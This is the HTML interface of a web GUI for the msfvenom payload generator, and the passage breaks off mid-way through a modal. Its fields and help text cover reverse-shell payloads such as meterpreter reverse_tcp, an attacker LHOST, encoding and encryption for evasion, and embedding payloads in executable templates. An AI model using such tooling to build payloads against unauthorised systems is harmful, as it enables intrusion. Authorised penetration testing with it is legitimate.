<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MSFvenom Web GUI</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Lucide Icons CDN -->
    <script src="https://unpkg.com/lucide@latest"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #1a202c; /* Dark background */
            color: #e2e8f0; /* Light text */
        }
        .tab-button.active {
            background-color: #9B59B6; /* Amethyst Purple */
            color: black;
            font-weight: bold;
        }
        .tab-content {
            display: none;
        }
        .tab-content.active {
            display: block;
        }
        /* Custom scrollbar for output area */
        .custom-scrollbar::-webkit-scrollbar {
            width: 12px;
            height: 12px;
        }
        .custom-scrollbar::-webkit-scrollbar-track {
            background: #2C3E50; /* Dark Blue/Grey */
            border-radius: 10px;
        }
        .custom-scrollbar::-webkit-scrollbar-thumb {
            background-color: #9B59B6; /* Amethyst Purple */
            border-radius: 10px;
            border: 3px solid #2C3E50;
        }
        .custom-scrollbar::-webkit-scrollbar-corner {
            background: #2C3E50;
        }

        /* Specific colors for msfvenom output */
        .output-green { color: #2ECC71; } /* Emerald Green */
        .output-red { color: #E74C3C; }   /* Alizarin Red */
        .output-blue { color: #9B59B6; }  /* Amethyst Purple */
        .output-orange { color: #F39C12; } /* Orange */
        .output-default { color: #ECF0F1; } /* Light Grey */
        .highlight { background-color: yellow; color: black; }

        /* Help popup styling */
        .help-popup {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #2C3E50; /* Dark Blue/Grey */
            border-radius: 0.5rem;
            box-shadow: 0 10px 15px rgba(0, 0, 0, 0.5);
            z-index: 1000;
            padding: 1.5rem;
            width: 90%;
            max-width: 500px;
            max-height: 80vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            border: 1px solid #9B59B6; /* Add a border for better visibility */
        }
        .help-popup-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            z-index: 999;
        }

        /* Modal styles */
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0,0,0,0.8); /* Dark modal background */
            align-items: center;
            justify-content: center;
        }
        .modal-content {
            background-color: #1a202c; /* Modal background */
            margin: auto;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
            width: 90%;
            max-width: 700px;
            max-height: 90vh;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            border: 1px solid #9B59B6; /* Purple border for modal */
        }
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding-bottom: 10px;
            border-bottom: 1px solid #9B59B6;
            margin-bottom: 15px;
        }
        .modal-header h2 {
            @apply text-xl font-semibold text-purple-400; /* Purple modal title */
        }
        .modal-close {
            @apply text-gray-400 hover:text-purple-400 text-2xl font-bold;
            cursor: pointer;
        }
        .modal-body {
            flex-grow: 1;
            overflow-y: auto;
            @apply text-gray-300;
        }
        .modal-footer {
            padding-top: 15px;
            border-top: 1px solid #9B59B6;
            margin-top: 15px;
            text-align: right;
        }

        /* Input field styling */
        input[type="text"], input[type="number"], select, textarea {
            @apply bg-gray-600 text-white rounded-md border border-gray-500 shadow-sm focus:border-purple-500 focus:ring focus:ring-purple-500 focus:ring-opacity-50 p-2;
        }
        input[type="checkbox"] {
            @apply form-checkbox h-5 w-5 text-purple-600 rounded bg-gray-600 border-gray-500;
        }

        /* Button styling */
        .btn-primary {
            @apply px-4 py-2 bg-purple-600 text-white rounded-md hover:bg-purple-700 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:ring-opacity-50 flex items-center justify-center transition-colors duration-200;
        }
        .btn-secondary {
            @apply px-4 py-2 bg-gray-700 text-gray-200 rounded-md hover:bg-gray-600 focus:outline-none focus:ring-2 focus:ring-gray-500 focus:ring-opacity-50 flex items-center justify-center transition-colors duration-200;
        }
        .btn-success {
            @apply px-6 py-3 bg-green-600 text-white rounded-lg text-lg font-semibold hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-opacity-50 flex items-center transition-colors duration-200 transform hover:scale-105;
        }
        .btn-danger {
            @apply px-6 py-3 bg-red-600 text-white rounded-lg text-lg font-semibold hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-red-500 focus:ring-opacity-50 flex items-center transition-colors duration-200 transform hover:scale-105;
        }
        .btn-info {
            @apply px-6 py-3 bg-blue-600 text-white rounded-lg text-lg font-semibold hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-opacity-50 flex items-center transition-colors duration-200 transform hover:scale-105;
        }
    </style>
</head>
<body class="p-4 min-h-screen flex flex-col items-center">
    <div class="bg-gray-800 p-6 rounded-lg shadow-xl w-full max-w-6xl mb-6">
        <div class="flex items-center justify-between mb-6">
            <h1 class="text-3xl font-bold text-purple-400">MSFvenom Web GUI</h1>
            <div class="flex space-x-2">
                <button id="install_msfvenom_linux_button" class="btn-primary">
                    <i data-lucide="download" class="w-5 h-5 mr-2"></i> Install MSFvenom (Linux)
                </button>
                <button id="install_msfvenom_termux_button" class="btn-primary">
                    <i data-lucide="download" class="w-5 h-5 mr-2"></i> Install MSFvenom (Termux)
                </button>
                <button id="download_msfvenom_windows_button" class="btn-primary">
                    <i data-lucide="download" class="w-5 h-5 mr-2"></i> Download MSFvenom (Windows)
                </button>
            </div>
        </div>

        <!-- Tabs Navigation -->
        <div class="flex flex-wrap justify-center bg-gray-700 rounded-t-lg p-2 mb-4">
            <button class="tab-button px-4 py-2 rounded-md text-sm font-medium transition-colors duration-200 hover:bg-purple-600 active" data-tab="payload">Payload Options</button>
            <button class="tab-button px-4 py-2 rounded-md text-sm font-medium transition-colors duration-200 hover:bg-purple-600" data-tab="encoding">Encoding Options</button>
            <button class="tab-button px-4 py-2 rounded-md text-sm font-medium transition-colors duration-200 hover:bg-purple-600" data-tab="output">Output Options</button>
            <button class="tab-button px-4 py-2 rounded-md text-sm font-medium transition-colors duration-200 hover:bg-purple-600" data-tab="advanced">Advanced Options</button>
            <button class="tab-button px-4 py-2 rounded-md text-sm font-medium transition-colors duration-200 hover:bg-purple-600" data-tab="nops">NOPs Options</button>
            <button class="tab-button px-4 py-2 rounded-md text-sm font-medium transition-colors duration-200 hover:bg-purple-600" data-tab="custom">Custom Options</button>
            <button class="tab-button px-4 py-2 rounded-md text-sm font-medium transition-colors duration-200 hover:bg-purple-600" data-tab="examples">Examples</button>
        </div>

        <!-- Tab Content -->
        <div id="tab-content-container" class="bg-gray-700 p-4 rounded-b-lg mb-4 max-h-[500px] overflow-y-auto custom-scrollbar">
            <!-- Payload Options Tab -->
            <div id="payload" class="tab-content active">
                <h2 class="text-xl font-semibold text-purple-300 mb-4">Payload Options</h2>
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div class="flex items-center">
                        <label for="payload_entry" class="w-48 text-right pr-4">Payload (-p):</label>
                        <input type="text" id="payload_entry" name="payload_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="generateCommand()" placeholder="e.g., windows/meterpreter/reverse_tcp">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Specify the payload to use (e.g., windows/meterpreter/reverse_tcp). Use --list-payloads to see available payloads.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="lhost_entry" class="w-48 text-right pr-4">LHOST:</label>
                        <input type="text" id="lhost_entry" name="lhost_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="generateCommand()" placeholder="e.g., 192.168.1.100">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Local host IP address for reverse connections (e.g., your attacker machine IP).')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="lport_entry" class="w-48 text-right pr-4">LPORT:</label>
                        <input type="number" id="lport_entry" name="lport_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="generateCommand()" placeholder="e.g., 4444">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Local port for reverse connections.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="rhost_entry" class="w-48 text-right pr-4">RHOST:</label>
                        <input type="text" id="rhost_entry" name="rhost_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="generateCommand()" placeholder="e.g., 10.0.0.5">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Remote host IP address for bind connections.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="rport_entry" class="w-48 text-right pr-4">RPORT:</label>
                        <input type="number" id="rport_entry" name="rport_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="generateCommand()" placeholder="e.g., 8080">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Remote port for bind connections.')">?</button>
                    </div>
                </div>
            </div>

            <!-- Encoding Options Tab -->
            <div id="encoding" class="tab-content">
                <h2 class="text-xl font-semibold text-purple-300 mb-4">Encoding Options</h2>
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div class="flex items-center">
                        <label for="encoder_entry" class="w-48 text-right pr-4">Encoder (-e):</label>
                        <input type="text" id="encoder_entry" name="encoder_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="generateCommand()" placeholder="e.g., x86/shikata_ga_nai">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('The encoder to use. Use --list-encoders to see available encoders.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="iterations_entry" class="w-48 text-right pr-4">Iterations (-i):</label>
                        <input type="number" id="iterations_entry" name="iterations_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="generateCommand()" placeholder="e.g., 5">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('The number of times to encode the payload.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <input type="checkbox" id="keep_template_var" name="keep_template_var" class="form-checkbox h-5 w-5 text-purple-600 rounded bg-gray-600 border-gray-500" onchange="generateCommand()">
                        <label for="keep_template_var" class="ml-2">Keep Template (-k)</label>
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Keep the original template behavior and don\'t inject the payload.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="template_entry" class="w-48 text-right pr-4">Template (-x):</label>
                        <input type="text" id="template_entry" name="template_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="generateCommand()" placeholder="e.g., /path/to/template.exe">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Specify a custom executable template to embed the payload in.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="arch_entry" class="w-48 text-right pr-4">Architecture (-a):</label>
                        <input type="text" id="arch_entry" name="arch_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="generateCommand()" placeholder="e.g., x86">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('The architecture to use. Use --list-architectures to see available architectures.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="platform_entry" class="w-48 text-right pr-4">Platform (--platform):</label>
                        <input type="text" id="platform_entry" name="platform_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="generateCommand()" placeholder="e.g., windows">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('The platform to use. Use --list-platforms to see available platforms.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="bad_chars_entry" class="w-48 text-right pr-4">Bad Characters (--bad-chars):</label>
                        <input type="text" id="bad_chars_entry" name="bad_chars_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="generateCommand()" placeholder="e.g., '\x00\x0a\x0d'">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Characters to avoid in the payload (e.g., \\x00\\x0a\\x0d).')">?</button>
                    </div>
                    <div class="flex items-center">
                        <input type="checkbox" id="encoder_info_var" name="encoder_info_var" class="form-checkbox h-5 w-5 text-purple-600 rounded bg-gray-600 border-gray-500" onchange="generateCommand()">
                        <label for="encoder_info_var" class="ml-2">Show Encoder Info (--encoder-info)</label>
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Show information about the specified encoder.')">?</button>
                    </div>
                </div>
            </div>

            <!-- Output Options Tab -->
            <div id="output" class="tab-content">
                <h2 class="text-xl font-semibold text-purple-300 mb-4">Output Options</h2>
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div class="flex items-center">
                        <label for="format_entry" class="w-48 text-right pr-4">Format (-f):</label>
                        <input type="text" id="format_entry" name="format_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="generateCommand()" placeholder="e.g., exe">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('The output format (e.g., exe, raw, c, python). Use --list-formats to see available formats.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="output_file_entry" class="w-48 text-right pr-4">Output File (-o):</label>
                        <input type="text" id="output_file_entry" name="output_file_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="generateCommand()" placeholder="e.g., payload.exe">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('The output filename.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <input type="checkbox" id="verbose_var" name="verbose_var" class="form-checkbox h-5 w-5 text-purple-600 rounded bg-gray-600 border-gray-500" onchange="generateCommand()">
                        <label for="verbose_var" class="ml-2">Verbose (-v)</label>
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Enable verbose output.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <input type="checkbox" id="help_var" name="help_var" class="form-checkbox h-5 w-5 text-purple-600 rounded bg-gray-600 border-gray-500" onchange="generateCommand()">
                        <label for="help_var" class="ml-2">Show Help (-h)</label>
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Show help message.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <input type="checkbox" id="list_options_var" name="list_options_var" class="form-checkbox h-5 w-5 text-purple-600 rounded bg-gray-600 border-gray-500" onchange="generateCommand()">
                        <label for="list_options_var" class="ml-2">List Options (--list-options)</label>
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('List all available options.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <input type="checkbox" id="list_formats_var" name="list_formats_var" class="form-checkbox h-5 w-5 text-purple-600 rounded bg-gray-600 border-gray-500" onchange="generateCommand()">
                        <label for="list_formats_var" class="ml-2">List Formats (--list-formats)</label>
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('List all available formats.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <input type="checkbox" id="list_encoders_var" name="list_encoders_var" class="form-checkbox h-5 w-5 text-purple-600 rounded bg-gray-600 border-gray-500" onchange="generateCommand()">
                        <label for="list_encoders_var" class="ml-2">List Encoders (--list-encoders)</label>
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('List all available encoders.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <input type="checkbox" id="list_payloads_var" name="list_payloads_var" class="form-checkbox h-5 w-5 text-purple-600 rounded bg-gray-600 border-gray-500" onchange="generateCommand()">
                        <label for="list_payloads_var" class="ml-2">List Payloads (--list-payloads)</label>
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('List all available payloads.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <input type="checkbox" id="list_nops_var" name="list_nops_var" class="form-checkbox h-5 w-5 text-purple-600 rounded bg-gray-600 border-gray-500" onchange="generateCommand()">
                        <label for="list_nops_var" class="ml-2">List NOPs (--list-nops)</label>
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('List all available NOP generators.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <input type="checkbox" id="list_architectures_var" name="list_architectures_var" class="form-checkbox h-5 w-5 text-purple-600 rounded bg-gray-600 border-gray-500" onchange="generateCommand()">
                        <label for="list_architectures_var" class="ml-2">List Architectures (--list-architectures)</label>
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('List all available architectures.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <input type="checkbox" id="list_platforms_var" name="list_platforms_var" class="form-checkbox h-5 w-5 text-purple-600 rounded bg-gray-600 border-gray-500" onchange="generateCommand()">
                        <label for="list_platforms_var" class="ml-2">List Platforms (--list-platforms)</label>
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('List all available platforms.')">?</button>
                    </div>
                </div>
            </div>

            <!-- Advanced Options Tab -->
            <div id="advanced" class="tab-content">
                <h2 class="text-xl font-semibold text-purple-300 mb-4">Advanced Options</h2>
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div class="flex items-center">
                        <input type="checkbox" id="smallest_var" name="smallest_var" class="form-checkbox h-5 w-5 text-purple-600 rounded bg-gray-600 border-gray-500" onchange="generateCommand()">
                        <label for="smallest_var" class="ml-2">Smallest Payload (--smallest)</label>
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Generate the smallest possible payload.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="encrypt_entry" class="w-48 text-right pr-4">Encrypt (--encrypt):</label>
                        <input type="text" id="encrypt_entry" name="encrypt_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="generateCommand()" placeholder="e.g., aes256">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Encrypt the payload with a given algorithm (e.g., aes256, rc4).')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="encrypt_key_entry" class="w-48 text-right pr-4">Encryption Key (--encrypt-key):</label>
                        <input type="text" id="encrypt_key_entry" name="encrypt_key_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="generateCommand()" placeholder="e.g., 0xAABBCCDDEEFF0123456789ABCDEF0123">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('The key to use for encryption.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="encrypt_iv_entry" class="w-48 text-right pr-4">Encryption IV (--encrypt-iv):</label>
                        <input type="text" id="encrypt_iv_entry" name="encrypt_iv_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="generateCommand()" placeholder="e.g., 0x1234567890ABCDEF">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('The initialization vector to use for encryption.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="iteration_time_entry" class="w-48 text-right pr-4">Iteration Time (--iteration-time):</label>
                        <input type="number" id="iteration_time_entry" name="iteration_time_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="generateCommand()" placeholder="e.g., 500">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('The iteration time in milliseconds for some encoders.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="custom_template_entry" class="w-48 text-right pr-4">Custom Template (--template):</label>
                        <input type="text" id="custom_template_entry" name="custom_template_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="generateCommand()" placeholder="e.g., /path/to/custom.exe">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Specify a custom executable template to embed the payload in (alternative to -x).')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="section_entry" class="w-48 text-right pr-4">Section (--section):</label>
                        <input type="text" id="section_entry" name="section_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="generateCommand()" placeholder="e.g., .text">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('The section to inject the payload into (for some executable formats).')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="force_platform_entry" class="w-48 text-right pr-4">Force Platform (--force-platform):</label>
                        <input type="text" id="force_platform_entry" name="force_platform_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="generateCommand()" placeholder="e.g., windows">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Force the platform for the payload.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="force_arch_entry" class="w-48 text-right pr-4">Force Architecture (--force-arch):</label>
                        <input type="text" id="force_arch_entry" name="force_arch_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="generateCommand()" placeholder="e.g., x64">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Force the architecture for the payload.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <input type="checkbox" id="debug_var" name="debug_var" class="form-checkbox h-5 w-5 text-purple-600 rounded bg-gray-600 border-gray-500" onchange="generateCommand()">
                        <label for="debug_var" class="ml-2">Debug (--debug)</label>
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Enable debug output.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <input type="checkbox" id="raw_var" name="raw_var" class="form-checkbox h-5 w-5 text-purple-600 rounded bg-gray-600 border-gray-500" onchange="generateCommand()">
                        <label for="raw_var" class="ml-2">Raw Output (--raw)</label>
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Output raw shellcode.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="checksum_type_entry" class="w-48 text-right pr-4">Checksum Type (--checksum-type):</label>
                        <input type="text" id="checksum_type_entry" name="checksum_type_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="generateCommand()" placeholder="e.g., sha256">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Specify the checksum type for some formats (e.g., sha1, sha256).')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="add_code_entry" class="w-48 text-right pr-4">Add Code (--add-code):</label>
                        <input type="text" id="add_code_entry" name="add_code_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="generateCommand()" placeholder="e.g., /path/to/extra.bin">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Add custom shellcode file to the payload.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="prepend_shellcode_entry" class="w-48 text-right pr-4">Prepend Shellcode (--prepend-shellcode):</label>
                        <input type="text" id="prepend_shellcode_entry" name="prepend_shellcode_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="generateCommand()" placeholder="e.g., /path/to/prepend.bin">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Prepend shellcode from a file.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="append_shellcode_entry" class="w-48 text-right pr-4">Append Shellcode (--append-shellcode):</label>
                        <input type="text" id="append_shellcode_entry" name="append_shellcode_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="generateCommand()" placeholder="e.g., /path/to/append.bin">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Append shellcode from a file.')">?</button>
                    </div>
                </div>
            </div>

            <!-- NOPs Options Tab -->
            <div id="nops" class="tab-content">
                <h2 class="text-xl font-semibold text-purple-300 mb-4">NOPs Options</h2>
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div class="flex items-center">
                        <label for="nops_entry" class="w-48 text-right pr-4">NOP Generator (-n):</label>
                        <input type="text" id="nops_entry" name="nops_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="generateCommand()" placeholder="e.g., x86/optyma">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('The NOP generator to use. Use --list-nops to see available NOP generators.')">?</button>
                    </div>
                </div>
            </div>

            <!-- Custom Options Tab -->
            <div id="custom" class="tab-content">
                <h2 class="text-xl font-semibold text-purple-300 mb-4">Custom Options</h2>
                <div class="grid grid-cols-1 gap-4">
                    <div class="flex items-start">
                        <label for="custom_options_entry" class="w-48 text-right pr-4 pt-2">Additional Custom Options:</label>
                        <textarea id="custom_options_entry" name="custom_options_entry" rows="8" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="generateCommand()" placeholder="Enter any other msfvenom arguments not covered by the GUI, one per line. E.g.,&#10;--smallest&#10;--data-length 100"></textarea>
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Any other msfvenom arguments not covered by the GUI. Enter them exactly as you would on the command line, one per line (e.g., --smallest, --data-length 100).')">?</button>
                    </div>
                </div>
            </div>

            <!-- Examples Tab -->
            <div id="examples" class="tab-content">
                <h2 class="text-xl font-semibold text-purple-300 mb-4">Examples</h2>
                <div class="mb-4 flex items-center">
                    <label for="example_search_entry" class="w-32 text-right pr-4">Search Examples:</label>
                    <input type="text" id="example_search_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="filterExamples()">
                    <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-4 py-2 rounded" onclick="clearExampleSearch()">Clear Search</button>
                </div>
                <div id="examples_list" class="grid grid-cols-1 gap-4">
                    <!-- Examples will be loaded here by JavaScript -->
                </div>
            </div>
        </div>

        <!-- Generated Command -->
        <div class="bg-gray-700 p-4 rounded-lg shadow-md mb-4">
            <h2 class="text-xl font-semibold text-purple-300 mb-2">Generated MSFvenom Command</h2>
            <textarea id="command_text" class="w-full h-24 p-2 rounded bg-gray-900 text-purple-400 font-mono text-sm resize-none custom-scrollbar" readonly></textarea>
            <div class="flex justify-end mt-2 space-x-2">
                <button class="bg-purple-500 hover:bg-purple-600 text-white px-4 py-2 rounded-md transition-colors duration-200" onclick="copyCommand()">Copy Command</button>
                <button class="bg-purple-500 hover:bg-purple-600 text-white px-4 py-2 rounded-md transition-colors duration-200" onclick="generateCommand()">Generate Command</button>
            </div>
        </div>

        <!-- Action Buttons -->
        <div class="flex justify-center space-x-4 mb-4">
            <button id="run_msfvenom_button" class="btn-success">
                <i data-lucide="play" class="w-6 h-6 mr-2"></i> Generate Payload
            </button>
            <button class="btn-danger" onclick="clearOutput()">
                <i data-lucide="trash-2" class="w-6 h-6 mr-2"></i> Clear Output
            </button>
            <button id="download_payload_button" class="btn-info" disabled>
                <i data-lucide="download" class="w-6 h-6 mr-2"></i> Download Payload
            </button>
        </div>

        <!-- Status Bar -->
        <div id="status_bar" class="bg-gray-900 text-white text-sm p-2 rounded-md mb-4 text-center">Ready</div>

        <!-- MSFvenom Output -->
        <div class="bg-gray-700 p-4 rounded-lg shadow-md">
            <h2 class="text-xl font-semibold text-purple-300 mb-2">MSFvenom Output</h2>
            <div class="flex items-center mb-2">
                <label for="search_entry" class="pr-2">Search:</label>
                <input type="text" id="search_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="searchOutput()">
                <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-4 py-2 rounded" onclick="searchOutput()">Search</button>
                <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-4 py-2 rounded" onclick="clearSearchHighlight()">Clear Search</button>
            </div>
            <pre id="output_text" class="w-full h-96 p-2 rounded bg-gray-900 text-gray-200 font-mono text-sm overflow-auto custom-scrollbar"></pre>
        </div>
    </div>

    <!-- Footer -->
    <div class="text-gray-500 text-sm mt-4">
        Created by khedr0x00
    </div>

    <!-- Global Message/Alert Modal -->
    <div id="messageModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 id="messageModalTitle">Alert</h2>
                <span class="modal-close" onclick="closeMessageModal()">&times;</span>
            </div>
            <div class="modal-body" id="messageModalBody"></div>
            <div class="modal-footer">
                <button onclick="closeMessageModal()" class="btn-primary">OK</button>
            </div>
        </div>
    </div>

    <!-- Confirmation Modal for Linux/Termux Installation -->
    <div id="installConfirmModal" class="modal">
        <div class="modal-content">
